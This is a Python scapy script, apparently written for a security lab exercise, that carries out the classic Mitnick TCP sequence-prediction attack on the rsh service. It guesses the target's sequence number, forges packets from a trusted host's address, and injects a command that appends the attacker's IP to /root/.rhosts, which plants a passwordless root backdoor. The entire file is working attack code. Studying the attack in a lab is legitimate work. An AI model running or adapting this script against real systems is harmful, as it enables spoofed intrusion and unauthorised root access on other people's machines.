# python3 cp2.2.mitnick.py eth0 10.4.61.25 72.36.89.200
from scapy.all import *
import sys
import time

seq = 1000
sport = 666 # 512~1023
dport = 514 # RSH port
t_sleep = 1

# def predictSEQ(dst):

    # global seq, sport
    # prevSEQ = 0

    # for i in range(10):
        # # If sr1 doesnt send RST automatically, need to send it manually to reset the TCP stream
        # # send(IP(dst=dst) / TCP(sport=sport, dport=513, flags="R")
        # rep = sr1(IP(dst=dst) / TCP(sport=sport, dport=513, seq=seq, flags="S"), verbose=False)
        # print("#SEQ Difference:", rep.seq - prevSEQ)
        # prevSEQ = rep.seq
    # # send(IP(dst=dst) / TCP(sport=sport, dport=514, flags="R"), verbose=False)

def getACK(dst):
    
    global dport, sport, seq
    
    rep = sr1(IP(dst=dst) / TCP(sport=sport, dport=dport, seq=seq, flags="S"), verbose=False)
    if rep is None:
        exit()
    send(IP(dst=dst) / TCP(sport=sport, dport=dport, flags="R"), verbose=False)
    return rep.seq + 64000 + 1
    

def setSpoofConn(src, dst):

    global dport, sport, t_sleep, seq, ack
    
    send(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, seq=seq, flags="S"), verbose=False)
    
    # Wait for ack
    time.sleep(t_sleep)
    seq += 1
    send(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags="A"), verbose=False)

    
def sendPayload(src, dst, payload):

    global dport, sport, t_sleep, seq, ack
    
    send(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags="PA") / payload, verbose=False)
    seq += len(payload)
    
    # Wait for server ack
    time.sleep(t_sleep)
    

if __name__ == "__main__":

    attacker_ip = get_if_addr(sys.argv[1])
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]

    # TODO: figure out SYN sequence number pattern

    # predictSEQ(target_ip)
    ack = getACK(target_ip)
    print("#Getting ACK: %d" % ack)
    
    # TODO: TCP hijacking with predicted sequence number
    print("#Spoofing server")
    setSpoofConn(trusted_host_ip, target_ip)
    print("#Sending payload")
    sendPayload(trusted_host_ip, target_ip, "\0root\0root\0echo '%s root' >> /root/.rhosts\0" % attacker_ip)
    
    # Reset TCP stream
    send(IP(src=trusted_host_ip, dst=target_ip) / TCP(sport=sport, dport=dport, flags="R"), verbose=False)
